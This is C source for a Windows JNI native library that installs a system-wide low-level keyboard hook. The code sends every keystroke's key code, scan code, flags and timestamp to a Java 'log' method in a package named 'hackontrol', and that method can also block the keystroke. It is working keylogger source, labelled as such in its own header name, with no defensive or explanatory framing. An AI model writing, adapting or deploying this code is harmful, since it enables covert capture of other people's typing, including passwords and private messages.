#include <Windows.h>
#include <khopanjni.h>
#include <khopanerror.h>
#include "keylogger.h"

JavaVM* globalVirtualMachine;
jclass globalNativeLibraryClass;
jmethodID globalLogMethod;
JNIEnv* globalEnvironment;

DWORD WINAPI KeyLoggerThread(_In_ LPVOID);
LRESULT CALLBACK KeyLoggerProcedure(_In_ int, _In_ WPARAM, _In_ LPARAM);

void startKeyLogger(JNIEnv* environment, JavaVM* virtualMachine) {
	globalVirtualMachine = virtualMachine;
	DWORD identifier = 0;
	HANDLE thread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, &identifier);

	if(!thread) {
		KHWin32Error(environment, GetLastError(), "CreateThread");
	}
}

DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
	JNIEnv* environment;
	JavaVMAttachArgs arguments;
	arguments.version = JNI_VERSION_21;
	arguments.name = NULL;
	arguments.group = NULL;
	
	if((*globalVirtualMachine)->AttachCurrentThread(globalVirtualMachine, (void**) &environment, &arguments)) {
		return 1;
	}
	
	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");

	if(!nativeLibraryClass) {
		KHStandardError(environment, "Class 'com.khopan.hackontrol.NativeLibrary' not found");
		return 1;
	}

	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, nativeLibraryClass, "log", "(IIIII)Z");
	
	if(!logMethod) {
		KHStandardError(environment, "Method 'log(IIIII)V' not found in class 'com.khopan.hackontrol.NativeLibrary'");
		return 1;
	}

	globalNativeLibraryClass = nativeLibraryClass;
	globalLogMethod = logMethod;
	globalEnvironment = environment;
	
	if(!SetWindowsHookExW(WH_KEYBOARD_LL, KeyLoggerProcedure, NULL, 0)) {
		KHWin32Error(environment, GetLastError(), "SetWindowsHookExW");
		return 1;
	}
	
	MSG message;

	while(GetMessageW(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessageW(&message);
	}

	return 0;
}

LRESULT CALLBACK KeyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
	if(code != HC_ACTION) {
		return CallNextHookEx(NULL, code, wparam, lparam);
	}

	PKBDLLHOOKSTRUCT keyboard = (PKBDLLHOOKSTRUCT) lparam;
	jint keyAction = (jint) wparam;
	jint keyCode = (jint) keyboard->vkCode;
	jint scanCode = (jint) keyboard->scanCode;
	jint flags = (jint) keyboard->flags;
	jint time = (jint) keyboard->time;
	jboolean result = (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalNativeLibraryClass, globalLogMethod, keyAction, keyCode, scanCode, flags, time);
	return result ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
}
